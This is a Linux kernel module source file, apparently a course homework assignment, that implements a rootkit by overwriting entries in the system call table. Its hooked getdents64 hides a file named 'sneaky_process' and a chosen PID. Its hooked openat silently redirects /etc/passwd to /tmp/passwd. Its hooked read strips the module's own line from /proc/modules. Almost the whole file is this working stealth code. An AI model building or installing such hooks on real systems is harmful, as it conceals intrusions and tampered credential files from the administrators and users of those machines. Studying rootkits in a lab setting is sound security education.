#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>
#include <linux/slab.h>

#define PREFIX "sneaky_process"
//support command: /home/vcm/hw5
//log check: sudo tail -n 10 /var/log/syslog
//#1 ls /home/vcm/hw5   cd /home/vcm/hw5; ls  find /home/vcm/hw5 -name sneaky_process
//#2 ps -a -u sq44   ls /proc
//#3 cat /etc/passwd
//#4 lsmod

//This is a pointer to the system call table
static int isProcMod = 0; // 0-> not for proc, 1->proc
static unsigned long *sys_call_table;
static char *pid; // global string and fiiled by command line, do we need init it?
module_param(pid, charp, 0); //variable name, type, permissions
// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}


asmlinkage int (*original_getdents64)(const struct pt_regs *);
//sneaky version to hide attacking excutable file
asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs) {
  struct linux_dirent64 *usr_buf = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 *kernel_buf = NULL;
  struct linux_dirent64 *dir_pointer = NULL; // point to current dir in the struct
  unsigned long index = 0; // record relative position
  int sz = original_getdents64(regs);
  kernel_buf = kzalloc(sz, GFP_KERNEL);
  if ( (sz <= 0) || (kernel_buf == NULL) ) { // end of directory(num of bytes = 0 or no place allocted for buffer)
    return sz;
  }
  //printk(KERN_DEBUG "pid is %s\n", pid);
  copy_from_user(kernel_buf, usr_buf, sz); // move the struct info from user into kernel buffer(protect and restrict)
  while (index < sz) {
    dir_pointer = (void *)kernel_buf + index;
    if (strcmp(dir_pointer->d_name, PREFIX) == 0 || (strcmp(dir_pointer->d_name, pid)) == 0) { //name or pid meet condition
      // memcoy is not allowed here since mem overlap will cause crash
      memmove(dir_pointer, (void *)dir_pointer + dir_pointer->d_reclen, sz - dir_pointer->d_reclen - index);
      sz -= dir_pointer->d_reclen;
      continue;
    }
    index += dir_pointer->d_reclen;
  }
  copy_to_user(usr_buf, kernel_buf, sz); // bring back the modified info
  
  kfree(kernel_buf);
  return sz;
}


// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
  char * path_name = (char *)regs->si;
  // int sz = strlen(path_name);
  int sz = 512; //large enough to store names
  char * kernel_buf = NULL;
  kernel_buf = kzalloc(sz, GFP_KERNEL);
  // kernel_buf[sz] = '\0';
  copy_from_user(kernel_buf, path_name, sz);
  //printk(KERN_DEBUG  "open %s\n", kernel_buf);
  if (strncmp(kernel_buf, "/proc/modules", 14) == 0) {
    isProcMod = 1;
  } else {
    isProcMod = 0;
  }
  if(strncmp(kernel_buf, "/etc/passwd", 12) == 0) {
    copy_to_user((void*) path_name, "/tmp/passwd", 12); //12 is the number of bytes to copy(include \0)
    //printk(KERN_DEBUG  "open passwd\n");
  } 
  
  kfree(kernel_buf);
  return (*original_openat)(regs);//????why do not get sz inthe first line and feed to sz then change last to \0!!!
}

asmlinkage ssize_t (*original_read)(const struct pt_regs *);
//sneaky version to hide mod
asmlinkage ssize_t sneaky_sys_read(struct pt_regs* regs) {
  char * usr_buf = (char *)regs->si; //string of mod names
  char * kernel_buf = NULL; 
  ssize_t sz = original_read(regs);
  kernel_buf = kzalloc(sz, GFP_KERNEL);
  if ( (sz <= 0) || (kernel_buf == NULL) ) { // end of directory(num of bytes = 0 or no place allocted for buffer)
    return sz;
  }

  copy_from_user(kernel_buf, usr_buf, sz);
  char * mod_pointer = strstr(kernel_buf, "sneaky_mod"); 
  if (mod_pointer != NULL) {
    char * endOfLine = strchr(mod_pointer, '\n');
    if (endOfLine != NULL && (*(endOfLine + 1) != '\0') && isProcMod == 1) {
      ssize_t toBeMoved = (ssize_t)(endOfLine - mod_pointer) + 1; //length has 1 more
      // printk(KERN_DEBUG  "find line to be deleted: %.*s", (int)toBeMoved, mod_pointer);
      // printk(KERN_DEBUG "next useful line: %.30s\n", endOfLine + 1);
      // printk(KERN_DEBUG "I will remove size of %d\n", (int)((ssize_t)(endOfLine - kernel_buf) + 1));
      // printk(KERN_DEBUG "Remaining size is %d\n", (int)(sz - (ssize_t)(endOfLine - kernel_buf) - 1));
      memmove(mod_pointer, endOfLine + 1, sz - (ssize_t)(endOfLine - kernel_buf) - 1);
      sz -= toBeMoved;
    }
  }
  copy_to_user(usr_buf, kernel_buf, sz);

  kfree(kernel_buf);
  return sz;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void*)sys_call_table[__NR_getdents64];
  original_read = (void*)sys_call_table[__NR_read];
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64; //replace sys call with my version
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");